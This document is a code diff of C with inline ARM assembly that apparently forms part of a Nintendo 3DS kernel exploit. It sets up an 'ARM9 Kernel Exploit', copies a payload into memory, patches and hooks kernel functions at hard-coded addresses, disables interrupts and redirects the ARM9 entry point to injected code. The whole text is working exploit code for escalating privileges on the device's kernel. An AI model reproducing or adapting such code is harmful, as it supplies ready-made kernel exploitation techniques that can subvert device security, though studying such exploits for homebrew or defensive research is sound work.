@@ -228,6 +228,7 @@ void jump_table(void)
   reboot_func();
 }
 
+
 ARM9_PAYLOAD(void)
 {
 
@@ -239,14 +240,18 @@ arm9_kernel_exploit_setup(void)
 #ifdef DEBUG_PROCESS
 	printf("Setting up ARM9 Kernel Exploit\n");
 #endif
-	arm11_buffer[0] = 0xFAAFFAAF;
+
 	int FUNC_LEN;
 	int ARM9_PAYLOAD_LEN;
-	int (*sub_FFF748C4)(int, int, int, int) = 0xFFF748C4;
-	asm volatile ("clrex");
+	int (*reboot)(int, int, int, int) = 0xFFF748C4;
+	 __asm__ volatile(
+        "clrex"
+    );
 
 	InvalidateEntireInstructionCache();
 	InvalidateEntireDataCache();
+
+
 	arm11_buffer[0] =0;
 	// ARM9 code copied to FCRAM 0x23F00000
 	memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
@@ -268,8 +273,20 @@ arm9_kernel_exploit_setup(void)
 
 	InvalidateEntireDataCache();
 	
-	sub_FFF748C4(0, 0, 2, 0); // trigger reboot
+	reboot(0, 0, 2, 0); // trigger reboot
 }
+
+int __attribute__((naked))
+arm11_kernel_stub (void)
+{
+	__asm__ ("add sp, sp, #8\t\n");
+
+	arm11_kernel_exec ();
+
+	__asm__ ("movs r0, #0\t\n"
+			 "ldr pc, [sp], #4\t\n");
+}
+
 
 void func_patch_hook(void)
 {
@@ -308,19 +325,64 @@ void func_patch_hook(void)
   __asm__ ("ldmfd sp!, {r0-r12,lr}\t\n"
           "ldr r0, =0x44836\t\n"
           "str r0, [r1]\t\n"
-          "ldr pc, %0" : "=r" (func_hook_return));
+          "ldr pc, =0xFFF5045C");
 }
 
 // this is a patched version of function 0xFFFF097C
 // stuff found in the original code are skipped
 void reboot_func(void)
 {
+	 __asm__ (" SUB R3, R1, R0\t\n"
+	 		"MOV R1, R3,ASR#2\t\n"
+  			"CMP R1, #0\t\n"
+          	"BLE 18f\t\n"
+          	"MOVS R1, R3,LSL#29\t\n"
+          	"SUB R0, R0, #4\t\n"
+          	"SUB R1, R2, #4\t\n"
+          	"BPL 8f\t\n"
+          	"LDR R2, [R0,#4]!\t\n"
+          	"STR R2, [R1,#4]!");
+
+	 __asm__ ("8:\t\n"
+  			"MOVS R2, R3,ASR#3\t\n"
+          	"BEQ 18f");
+
+	 __asm__ ("10:\t\n"
+  			"LDR R3, [R0,#4]\t\n"
+          	"SUBS R2, R2, #1\t\n"
+          	"STR R3, [R1,#4]\t\n"
+          	"LDR R3, [R0,#8]!\t\n"
+          	"STR R3, [R1,#8]!\t\n"
+          	"BNE 10b");
+
+	 __asm__ ("18:\t\n"
+          	"BX LR");
+
+
+	 __asm__ ("MOV R0, #0x1FFFFFF8\t\n"
+  			"MOV R1, #0\t\n"
+          	"STR R1, [R0]\t\n"
+          	"LDR R1, =0x10163008\t\n"
+          	"LDR R2, =0x44846\t\n"
+          	"STR R2, [R1]\t\n"
+          	"LDR R8, =0x10140000");
   // disable all interrupts
   __asm__ ("mrs r0, cpsr\t\n"
            "orr r0, r0, #0x1C0\t\n"
            "msr cpsr_cx, r0" ::: "r0");
   while ( *(char *)0x10140000 & 1 ); // wait for powerup ready
   *(void **)0x2400000C = 0x23F00000; // our ARM9 payload
+  __asm__ ("3:\t\n"
+  			"LDRB R0, [R8]\t\n"
+          	"ANDS R0, R0, #1\t\n"
+          	"BNE 3b\t\n"
+          	"STR R9, [R10]\t\n"
+          	"MOV R0, #0x1FFFFFF8");
+  __asm__ ("4:\t\n"
+  			"LDR R1, [R0]\t\n"
+          	"CMP R1, #0\t\n"
+          	"BEQ 4b\t\n"
+          	"BX R1");
 }
 
 arm11_kernel_exec (void)
@@ -341,17 +403,6 @@ arm11_kernel_exec (void)
 	InvalidateEntireDataCache();
 
 	return 0;
-}
-
-int __attribute__((naked))
-arm11_kernel_stub (void)
-{
-	__asm__ ("add sp, sp, #8\t\n");
-
-	arm11_kernel_exec ();
-
-	__asm__ ("movs r0, #0\t\n"
-			 "ldr pc, [sp], #4\t\n");
 }
 
 int doARM11Hax()
